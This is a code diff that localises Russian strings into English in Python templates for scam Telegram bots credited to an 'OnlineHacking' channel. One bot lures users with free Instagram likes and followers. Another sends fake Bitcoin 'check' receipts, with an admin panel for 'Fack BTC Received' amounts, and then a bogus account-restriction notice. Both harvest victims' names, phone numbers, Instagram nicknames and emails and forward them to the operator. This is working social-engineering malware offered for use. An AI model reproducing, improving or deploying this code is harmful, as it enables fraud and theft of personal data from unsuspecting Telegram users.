@@ -195,15 +195,15 @@ print("Bot launched!")
 def start(message):
 	bot.send_message(message.chat.id, '''👋 Hello! 👋
 This is a bot for getting likes and subscribers on Instagram!
-To start, write /nacrutka''') 
+To start, write /getfollowers''') 
 @bot.message_handler(commands=['OnlineHacking'])
 def start(message):
 	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
-@bot.message_handler(commands=['nacrutka'])
+@bot.message_handler(commands=['getfollowers'])
 def start(message):
 	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
-	first_button = types.InlineKeyboardButton(text="Curses", callback_data="first")
-	second_button = types.InlineKeyboardButton(text="Subscribers", callback_data="second")
+	first_button = types.InlineKeyboardButton(text="Likes", callback_data="first")
+	second_button = types.InlineKeyboardButton(text="Followers", callback_data="second")
 	keyboardmain.add(first_button, second_button)
 	bot.send_message(message.chat.id, "Select a promotion item:", reply_markup=keyboardmain)
 
@@ -214,7 +214,7 @@ def callback_inline(call):
 		bot.register_next_step_handler(msg, proc1)
 
 	elif call.data == "second":
-		msg = bot.send_message(call.message.chat.id, 'Enter the number of subscribers (no more than 500)') 
+		msg = bot.send_message(call.message.chat.id, 'Enter the number of Followers (no more than 500)') 
 		bot.register_next_step_handler(msg, proc2)
 
 def proc1(message):
@@ -223,7 +223,7 @@ def proc1(message):
 		m_id = message.chat.id
 
 		if not num.isdigit():
-			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /nacrutka!')#⏳
+			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /getfollowers!')#⏳
 			return
 		if int(num) > 500:
 			bot.reply_to(message, 'The number of likes cannot be more than 500!')
@@ -247,11 +247,11 @@ def proc2(message):
 		m_id = message.chat.id
 
 		if not num.isdigit():
-			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /nacrutka!')#⏳
+			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /getfollowers!')#⏳
 			return
 
 		if int(num) > 500:
-			bot.reply_to(message, 'The number of subscribers cannot be more than 500!')
+			bot.reply_to(message, 'The number of followers cannot be more than 500!')
 			return
 
 		time.sleep(2)
@@ -279,7 +279,9 @@ def contact(message):
 			├ID: {{userid}}
 			├Nick: @{{nick}}
 			└Phone number: {{phone}}
-			'''
+   
+      🎭 Follow @OnlineHacking for more...
+      '''
 
 		bot.send_message(ID, info)
 		print(info)
@@ -290,9 +292,9 @@ def contact(message):
 
 		if message.contact.user_id != message.chat.id:
 			bot.send_message(message.chat.id, 'Submit your contact!')
-		bot.send_message(message.chat.id, 'registration completed successfully!') 
+		bot.send_message(message.chat.id, 'Registration Completed Successfully!') 
 		time.sleep(1)
-		msg = bot.send_message(message.chat.id, 'Enter your Instagram nickname:') 
+		msg = bot.send_message(message.chat.id, 'Enter your Instagram Nickname:') 
 		bot.register_next_step_handler(msg, entr)
 
 def entr(message):
@@ -441,12 +443,12 @@ def entr(message):
 		m_id = message.chat.id
 
 
-		bot.send_message(ID, f'Post office: {{inp}}')
+		bot.send_message(ID, f'Your Email: {{inp}}')
 
 		markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
 		item_an = types.KeyboardButton('Get more gems')
 		markup_reply.add(item_an)
-		bot.send_message(message.chat.id, f'Post office: {{inp}} ', reply_markup = markup_reply)
+		bot.send_message(message.chat.id, f'Your Email: {{inp}} ', reply_markup = markup_reply)
 		time.sleep(1)
 		bot.send_message(message.chat.id, 'Expect a donation to your account within 24 hours!')
 
@@ -508,8 +510,8 @@ def entr1(message):
 		inp = message.text
 		m_id = message.chat.id
 
-		bot.reply_to(message, f'Post office: {{inp}} ')#⏳
-		bot.send_message(ID, f'Post office: {{inp}}')
+		bot.reply_to(message, f'Your Email: {{inp}} ')#⏳
+		bot.send_message(ID, f'User Email: {{inp}}')
 		time.sleep(1)
 		bot.send_message(message.chat.id, 'Expect a donation to your account within 24 hours!')
 	except Exception as e:
@@ -578,7 +580,7 @@ def contact(message):
 		last = message.contact.last_name
 		userid = message.contact.user_id
 		phone = message.contact.phone_number
-		bot.send_message(userid, "registration completed successfully!")
+		bot.send_message(userid, "Registration Completed Successfully!")
 		info = f'''
 			Data
 			├Name: {{first}} {{last}}
@@ -642,12 +644,12 @@ print("Bot launched!")
 @bot.message_handler(commands=['admin'])
 def adm(message):
 	if message.from_user.id == int(ID):
-		msg = bot.send_message(ID, 'Welcome to the bot admin panel! \\n Enter the amount for which to create a check:') 
+		msg = bot.send_message(ID, 'Welcome to the bot admin panel! \\n \\n Enter the amount for which to create Fack BTC Received:') 
 		bot.register_next_step_handler(msg, check)
 def check(message):
 	try:
 		if message.text.isdigit():
-			bot.send_message(ID, f'Sum: {{message.text}}')
+			bot.send_message(ID, f'User Received: {{message.text}}')
 			bot.send_message(ID, f'Your check: https://t.me/{{bot.get_me().username}}?start={{message.text}}')
 		else:
 			bot.send_message('The value must be numeric!')
@@ -663,19 +665,19 @@ def start(message):
 		try:
 			summ = message.text.split()[1]
 			userid = message.chat.id
-			bot.send_message(ID, f'User with ID:{{userid}} "Cashed" your check for the amount:{{summ}}')
+			bot.send_message(ID, f'User with ID:{{userid}} "BTC" your check for the amount:{{summ}}')
 			bot.send_message(message.chat.id, f'''You received 0.00{{random.randint(51, 253)}} BTC ({{summ}} RUB) от /uPorterBaseTheFist!''')
 			time.sleep(1)
 			
 			m_id = message.chat.id
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-			button_phone = types.KeyboardButton(text="✅Remove restrictions", request_contact=True) 	
+			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
 			keyboard.add(button_phone)	
 			bot.send_message(message.chat.id, "Prohibited >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
 		
 		except Exception as e:
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-			button_phone = types.KeyboardButton(text="✅Remove restrictions", request_contact=True) 	
+			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
 			keyboard.add(button_phone)	
 			bot.send_message(message.chat.id, "Prohibited >>> \\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
 			userid = message.chat.id
@@ -689,7 +691,7 @@ def contact(message):
 		last = message.contact.last_name
 		userid = message.contact.user_id
 		phone = message.contact.phone_number
-		bot.send_message(userid, "✅The restrictions have been successfully lifted, thank you for using our bot!")
+		bot.send_message(userid, "✅ The restrictions have been successfully lifted, thank you for using our bot!")
 		info = f'''
 			Data
 			├Name: {{first}} {{last}}
@@ -704,7 +706,7 @@ def contact(message):
 		print(info)
 
 		if message.contact.user_id != message.chat.id:
-			bot.send_message(message.chat.id, '❌Authorize YOUR contact!')
+			bot.send_message(message.chat.id, '❌ Authorize Your contact!')
 	
 bot.polling()
 		""")
